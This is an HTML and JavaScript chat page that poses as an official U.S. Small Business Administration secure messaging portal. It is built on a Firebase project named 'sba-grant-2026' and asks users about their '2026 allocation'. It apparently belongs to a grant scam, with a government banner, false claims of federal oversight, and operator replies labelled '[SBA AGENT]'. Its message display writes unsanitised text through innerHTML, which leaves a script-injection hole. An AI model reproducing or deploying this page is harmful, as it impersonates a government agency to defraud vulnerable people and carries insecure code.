<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>SBA Portal | Secure Support</title>
    <style>
        :root { --sba-blue: #00274c; --sba-accent: #1e3a8a; }
        body { background: #f1f5f9; margin: 0; font-family: 'Segoe UI', Tahoma, sans-serif; }
        
        .gov-banner { background: #f1f1f1; color: #333; font-size: 10px; padding: 6px 15px; display: flex; align-items: center; font-weight: 700; border-bottom: 1px solid #ddd; }
        .header { background: var(--sba-blue); color: white; padding: 15px; display: flex; justify-content: space-between; align-items: center; box-shadow: 0 2px 5px rgba(0,0,0,0.1); }
        
        .chat-container { max-width: 600px; margin: 20px auto; padding: 0 15px; height: 80vh; display: flex; flex-direction: column; }
        .chat-area { background: white; flex: 1; display: flex; flex-direction: column; border-radius: 12px; overflow: hidden; box-shadow: 0 10px 25px rgba(0,0,0,0.05); }
        
        #messageDisplay { flex: 1; overflow-y: auto; padding: 20px; display: flex; flex-direction: column; gap: 12px; background: #f8fafc; scroll-behavior: smooth; }
        
        .bubble { max-width: 80%; padding: 12px 16px; border-radius: 18px; font-size: 13.5px; line-height: 1.5; word-wrap: break-word; position: relative; }
        .user { align-self: flex-end; background: var(--sba-accent); color: white; border-bottom-right-radius: 4px; box-shadow: 0 4px 10px rgba(30, 58, 138, 0.2); }
        .admin { align-self: flex-start; background: #e2e8f0; color: #1e293b; border-bottom-left-radius: 4px; border: 1px solid #cbd5e1; }
        
        .input-box { padding: 20px; border-top: 1px solid #e2e8f0; display: flex; gap: 10px; background: white; }
        input { flex: 1; padding: 14px; border: 1px solid #cbd5e1; border-radius: 8px; outline: none; font-size: 14px; }
        input:focus { border-color: var(--sba-accent); }
        
        .send-btn { background: var(--sba-accent); color: white; border: none; padding: 0 25px; border-radius: 8px; cursor: pointer; font-weight: 800; text-transform: uppercase; letter-spacing: 1px; transition: 0.3s; }
        .send-btn:hover { opacity: 0.9; }
        
        .back-btn { background: rgba(255,255,255,0.15); border: 1px solid rgba(255,255,255,0.3); color: white; padding: 6px 15px; border-radius: 6px; font-size: 11px; font-weight: 700; cursor: pointer; }
    </style>
</head>
<body>

    <div class="gov-banner">
        <img src="https://upload.wikimedia.org/wikipedia/en/thumb/a/a4/Flag_of_the_United_States.svg/20px-Flag_of_the_United_States.svg.png" style="width:14px; margin-right:8px;">
        OFFICIAL U.S. GOVERNMENT SYSTEM - SECURE COMMUNICATION CHANNEL
    </div>

    <div class="header">
        <strong style="letter-spacing: 1px; font-size: 14px;">SBA SECURE MESSAGING</strong>
        <button class="back-btn" onclick="location.href='dashboard.html'">BACK TO PORTAL</button>
    </div>

    <div class="chat-container">
        <div class="chat-area">
            <div id="messageDisplay">
                <div class="bubble admin"><b>[SYSTEM]:</b> Establishing encrypted session...</div>
            </div>
            <div class="input-box">
                <input type="text" id="userInput" placeholder="Type your message to the agent...">
                <button id="sendBtn" class="send-btn">SEND</button>
            </div>
        </div>
        <p style="text-align: center; font-size: 10px; color: #94a3b8; margin-top: 15px;">
            <b>NOTICE:</b> All messages are recorded for 2026 compliance audits and federal oversight.
        </p>
    </div>

    <script type="module">
        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.0/firebase-app.js";
        import { getAuth, onAuthStateChanged } from "https://www.gstatic.com/firebasejs/10.7.0/firebase-auth.js";
        import { getFirestore, collection, addDoc, query, where, onSnapshot, serverTimestamp, orderBy } from "https://www.gstatic.com/firebasejs/10.7.0/firebase-firestore.js";

        const firebaseConfig = {
            apiKey: "AIzaSyB5nOOx153po4nWh4irbmTAcxsCZaM1-9k",
            authDomain: "sba-grant-2026.firebaseapp.com",
            projectId: "sba-grant-2026",
            storageBucket: "sba-grant-2026.firebasestorage.app",
            messagingSenderId: "838430821326",
            appId: "1:838430821326:web:6438deacb334076a64f99f"
        };

        const app = initializeApp(firebaseConfig);
        const auth = getAuth(app);
        const db = getFirestore(app);

        onAuthStateChanged(auth, (user) => {
            if (user) {
                // Query messages for the logged-in user, ordered by time
                const q = query(
                    collection(db, "support_tickets"), 
                    where("userId", "==", user.uid),
                    orderBy("timestamp", "asc")
                );

                onSnapshot(q, (snapshot) => {
                    const display = document.getElementById('messageDisplay');
                    display.innerHTML = '<div class="bubble admin"><b>[SBA AGENT]:</b> Secure session active. How can we assist with your 2026 allocation today?</div>';
                    
                    snapshot.forEach(d => {
                        const m = d.data();
                        const div = document.createElement('div');
                        div.className = `bubble ${m.sender === 'USER' ? 'user' : 'admin'}`;
                        
                        // Prefix only for Admin replies to show authority
                        const prefix = m.sender === 'ADMIN' ? '<b>[SBA AGENT]:</b> ' : '';
                        div.innerHTML = prefix + m.message;
                        display.appendChild(div);
                    });
                    // Always scroll to the latest message
                    display.scrollTop = display.scrollHeight;
                }, (error) => {
                    console.error("Firebase Index required: ", error);
                });
            } else {
                window.location.href = 'index.html';
            }
        });

        const sendMessage = async () => {
            const input = document.getElementById('userInput');
            const msg = input.value.trim();
            if(!msg) return;

            const user = auth.currentUser;
            input.value = ""; // Fast UI response
            
            try {
                await addDoc(collection(db, "support_tickets"), {
                    userId: user.uid,
                    message: msg,
                    sender: "USER",
                    timestamp: serverTimestamp()
                });
            } catch (err) {
                alert("Connection lost. Please refresh.");
            }
        };

        document.getElementById('sendBtn').onclick = sendMessage;

        // Allow pressing "Enter" to send
        document.getElementById('userInput').addEventListener('keypress', (e) => {
            if (e.key === 'Enter') sendMessage();
        });
    </script>
</body>
</html>
